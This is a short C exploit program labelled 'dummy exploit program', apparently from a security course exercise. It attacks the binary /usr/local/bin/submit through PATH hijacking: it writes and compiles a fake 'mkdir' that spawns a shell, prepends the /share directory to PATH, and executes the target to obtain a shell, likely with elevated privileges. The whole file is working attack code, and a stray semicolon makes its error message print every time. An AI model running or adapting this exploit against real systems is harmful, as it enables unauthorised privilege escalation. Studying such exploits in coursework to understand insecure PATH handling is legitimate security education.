/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define TARGET "/usr/local/bin/submit"

int main(int argc, char **argv, char* envp[]) {
    char *args[3];
    args[0] = TARGET;
    args[1] = "file.c";
    args[2] = NULL;
    system("echo '#include <unistd.h>\n"
    "#include <string.h>\n"
    "\n"
    "int main(void) {\n"
    "  setenv(\"PATH\",\"/usr/local/sbin:/usr/local/bin:"
      "/usr/sbin:/usr/bin:/sbin:/bin\",1);\n"
    "  system(\"sh\");\n"
    "  return 0;\n"
    "}' > file.c");
    system("gcc file.c -o mkdir");
    setenv("PATH","/share:/usr/local/bin:/usr/bin:"
      "/bin:/usr/bin/X11:/usr/games",1);
    if (execve(TARGET, args, envp)<0);
        fprintf(stderr,"execve failed.\n");
    
      exit(0);
}
